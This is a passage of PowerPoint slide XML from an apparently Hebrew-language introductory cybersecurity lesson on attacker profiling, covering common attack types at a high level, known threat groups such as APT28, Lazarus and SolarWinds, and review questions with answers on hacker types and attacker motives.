              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Phishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שליחת הודעות מזויפות במטרה להשיג מידע אישי או פרטי גישה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כופר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תוכנות שמצפינות את קבצי הקורבן ודורשות כופר כדי לשחררם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התקפות שמעמיסות על שרתים ומשבשות את פעילותם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול פרצות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Exploits </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בתוכנה או בחומרה כדי לחדור למערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הנדסה חברתית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Social Engineering</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש במניפולציות פסיכולוגיות כדי להוציא מידע מאנשים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="373058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41F31A3-7563-4443-968F-FFCB3FBE7C30}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4601816" y="642594"/>
            <a:ext cx="6523383" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד יוצרים פרופיל תוקף?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C834CA45-5506-4EB3-9438-E7A3BA40E182}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1828800"/>
            <a:ext cx="10058400" cy="5307495"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תהליך יצירת פרופיל תוקף:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איסוף מידע </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Information Gathering</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. שימוש בכלי ניטור והאזנה לרשתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Network Monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. ניתוח נתוני לוג </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Log Analysis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ממערכות שונות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. שימוש במודיעין סייבר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Cyber Threat Intelligence </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ממקורות חיצוניים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניתוח </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זיהוי דפוסי פעילות חשודים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניתוח מניעים פוטנציאליים של התוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הערכת רמת היכולות והמשאבים של התוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בניית הפרופיל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Profiling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יצירת פרופיל מפורט שכולל את כל המידע שנאסף ונותח.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עדכון מתמיד של הפרופיל על בסיס מידע חדש שמתקבל</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4148931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02E4233-048F-483B-A5C8-899BF0EBB005}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1341782" y="642594"/>
            <a:ext cx="9783417" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמאות לקביעת פרופיל בעולם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>האמיתי</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DA1B1021-E249-4573-96A8-FC6E256CC8E6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>קבוצת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> APT Advanced Persistent Threat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קבוצות כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>APT28 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> המוכרת גם כ-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Fancy Bear </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמקושרת למודיעין הצבאי הרוסי, מבצעות התקפות ממוקדות ומורכבות נגד מטרות ממשלתיות ועסקיות. הפרופיל שלהן כולל מניעים פוליטיים, יכולות טכניות גבוהות, ומשאבים כמעט בלתי מוגבלים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>קבוצת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Lazarus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> קבוצה צפון קוריאנית המוכרת בהתקפות סייבר למטרות פיננסיות, כמו הפריצה לבנק המרכזי של בנגלדש ב-2016, שבה ניסו לגנוב 1 מיליארד דולר (הצליחו לגנוב 81 מיליון דולר).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> SolarWinds</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ב-2020 נחשפה התקפה רחבת היקף שבה תוקפים הצליחו להחדיר קוד זדוני לעדכוני תוכנה של חברת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SolarWinds</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפה זו פגעה בארגונים ממשלתיים ועסקיים רבים, ונחשבת להתקפת ריגול תעשייתי מתוחכמת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="138712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B7F7355-D895-4FC8-8560-995EF565950F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5715000" y="642594"/>
            <a:ext cx="5410200" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – פרופיל תוקף</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E11B7313-93B1-4794-A048-813C4E64E282}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL"/>
              <a:t>מה הם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ההבדלים העיקריים בין האקר כובע שחור </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>להאקר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כובע לבן?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. איך ניתן לזהות תוקף פוטנציאלי על בסיס הפרופיל שלו?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מה הן השיטות הנפוצות בהן משתמשים תוקפים פוליטיים?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. איך יכולות חברות להיערך טוב יותר נגד התקפות על בסיס פרופיל התוקף?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2139467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9AA54E-7D45-427D-BE31-41E199000DA5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5744816" y="642594"/>
            <a:ext cx="5380383" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – פרופיל תוקף</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{77AD32B8-CB64-4DE8-B174-1C04EE00AD00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2276060"/>
            <a:ext cx="10058400" cy="3758979"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. האקרים כובע שחור והאקרים כובע לבן פועלים בשיטות דומות אך למטרות שונות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>האקר כובע שחור</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פועל באופן בלתי חוקי ולרוב ללא הסכמת הארגון או הפרט אותו הוא תוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מטרותיו כוללות גניבת מידע, יצירת נזק, גניבת כסף, או פשוט רצון להראות יכולת טכנית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>משתמש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ופרצות אבטחה למטרות אישיות או פיננסיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמאות כוללות פריצות למערכות בנקאיות, גניבת זהויות, והתקפות כופר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>האקר כובע לבן</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פועל באופן חוקי ובהסכמת הארגון או הפרט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מטרותיו כוללות שיפור אבטחת המערכות על ידי גילוי ותיקון </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מבצע בדיקות חדירה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Penetration Testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לגלות נקודות תורפה במערכות ולספק פתרונות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עובד כקבלן עצמאי או במסגרת ארגונים המתמחים באבטחת מידע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3865827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D36F7C5-5131-43BC-A208-E9418C7D47EF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5804452" y="642594"/>
            <a:ext cx="5320748" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – פרופיל תוקף</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C17C00C6-B4B9-4E62-9EF5-35FBE1D89510}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1854641"/>
            <a:ext cx="10058400" cy="4754880"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. זיהוי תוקף פוטנציאלי על בסיס פרופיל כולל הבנת המניעים, השיטות והמאפיינים האישיים של התוקף:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקפים פיננסיים: מחפשים רווח כלכלי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקפים פוליטיים: מונעים על ידי אידיאולוגיה או מטרות פוליטיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקפים למטרות נקמה: פועלים מתוך תחושת פגיעה אישית או מקצועית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שיטות עבודה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כלים טכניים ספציפיים: תוקפים מסוימים משתמשים בכלים או תוכנות מסוימות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דפוסי תקיפה: שעות הפעילות, המטרות והסגנון של התקפות קודמות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מאפיינים אישיים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>גיל, מיקום גיאוגרפי, ותחומי עניין יכולים לתת רמזים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היסטוריה קודמת של פעולות דומות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34793699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B0DD914-9B94-44FB-BF50-6DEE0ED31B47}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5625548" y="642594"/>
            <a:ext cx="5499652" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – פרופיל תוקף</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4980A746-4D20-4F80-8F1E-72618923E87B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. תוקפים פוליטיים משתמשים בשיטות מגוונות, הנה כמה מהן:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שליחת הודעות דוא"ל או הודעות מזויפות כדי לגנוב מידע רגיש או לגרום להורדת תוכנה זדונית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דיסאינפורמציה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הפצת מידע שגוי או מגמתי במטרה להשפיע על דעת קהל או לפגוע במוניטין של יריבים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתקפות על מנת להפיל אתרי אינטרנט חשובים כדי לשבש תקשורת או לפגוע בשירותים חיוניים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>פריצות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: חדירה למערכות מידע של ארגונים פוליטיים או ממשלתיים כדי לגנוב מידע או ליצור נזק.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="815935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77E1F34-2324-436C-8FA2-30C6EDF7C7B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5724938" y="642594"/>
            <a:ext cx="5400261" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
